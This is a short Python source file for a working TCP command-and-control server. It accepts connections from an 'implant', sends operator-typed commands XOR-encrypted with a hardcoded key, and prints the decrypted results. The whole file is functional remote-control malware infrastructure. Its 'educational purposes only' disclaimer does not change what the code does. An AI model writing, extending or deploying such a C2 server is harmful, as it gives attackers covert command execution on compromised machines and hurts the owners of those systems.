# This is a simple TCP C2 (Command and Control) server that listens for incoming connections from the implant.
# It uses XOR encryption to communicate with the implant. The server accepts commands from the user,
# sends them to the implant, and prints the responses. The server runs indefinitely until interrupted.

# THIS CODE IS FOR EDUCATIONAL PURPOSES ONLY
# and should not be used for any malicious activities.

import socket
import base64

# XOR encryption key (must match the key used in the implant)
KEY = b'secret'

# XOR encryption/decryption function
# This function encrypts or decrypts data using the provided key
def xor(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

# Function to handle communication with a connected implant
def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")  # Log the connection details
    try:
        while True:
            # Prompt the user for a command to send to the implant
            command = input("C2 > ").strip()
            if not command:
                continue  # Skip if the command is empty

            # Encrypt the command using XOR encryption
            encrypted_cmd = xor(command.encode(), KEY)
            conn.send(encrypted_cmd)  # Send the encrypted command to the implant

            # Receive the response from the implant (up to 4096 bytes)
            response = conn.recv(4096)
            if not response:
                print("[-] Connection closed by implant")  # Log if the implant disconnects
                break

            # Decrypt the response using XOR encryption
            decrypted = xor(response, KEY).decode(errors='ignore')
            print(f"[+] Response:\n{decrypted}\n")  # Print the decrypted response
    except Exception as e:
        # Log any errors that occur during communication
        print(f"[-] Error: {e}")
    finally:
        # Ensure the connection is closed when done
        conn.close()

# Function to start the C2 server
def start_server(host="0.0.0.0", port=31102):
    # Create a TCP socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))  # Bind the socket to the specified host and port
    s.listen(1)  # Start listening for incoming connections (1 client at a time)
    print(f"[*] Listening on {host}:{port}...")  # Log the server's listening status

    while True:
        # Accept a new connection from an implant
        conn, addr = s.accept()
        # Handle the connected implant
        handle_client(conn, addr)

# Entry point of the script
if __name__ == "__main__":
    start_server()  # Start the C2 server